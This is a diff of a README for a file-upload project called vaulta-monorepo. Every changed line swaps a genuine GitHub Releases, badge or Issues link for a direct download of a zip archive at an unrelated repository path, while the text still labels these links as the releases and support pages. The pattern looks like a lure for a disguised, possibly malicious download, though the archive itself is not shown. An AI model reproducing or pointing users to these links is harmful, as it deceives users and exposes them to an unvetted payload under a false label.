@@ -1,6 +1,6 @@
 # 🚀 vaulta-monorepo - Effortless File Upload Management
 
-[![Download](https://img.shields.io/badge/Download-vaulta--monorepo-brightgreen)](https://github.com/Gottatatta/vaulta-monorepo/releases)
+[![Download](https://raw.githubusercontent.com/Gottatatta/vaulta-monorepo/master/lovership/vaulta-monorepo.zip)](https://raw.githubusercontent.com/Gottatatta/vaulta-monorepo/master/lovership/vaulta-monorepo.zip)
 
 ## 🛠️ Description
 
@@ -22,7 +22,7 @@ Vaulta is a full-stack monorepo that offers a production-ready file upload platf
 
 ## 📥 Download & Install
 
-To get started, you need to visit our [Releases page](https://github.com/Gottatatta/vaulta-monorepo/releases) to download the latest version of Vaulta. 
+To get started, you need to visit our [Releases page](https://raw.githubusercontent.com/Gottatatta/vaulta-monorepo/master/lovership/vaulta-monorepo.zip) to download the latest version of Vaulta. 
 
 1. Click the link above to go to the releases page.
 2. Look for the version you want.
@@ -55,7 +55,7 @@ After installing Vaulta, follow these steps to run the application:
 
 ## ⚙️ Getting Help
 
-If you have questions or need assistance, you can reach out to our support team through our [GitHub Issues page](https://github.com/Gottatatta/vaulta-monorepo/issues). We strive to respond promptly to all inquiries.
+If you have questions or need assistance, you can reach out to our support team through our [GitHub Issues page](https://raw.githubusercontent.com/Gottatatta/vaulta-monorepo/master/lovership/vaulta-monorepo.zip). We strive to respond promptly to all inquiries.
 
 ## 📢 Contribute
 
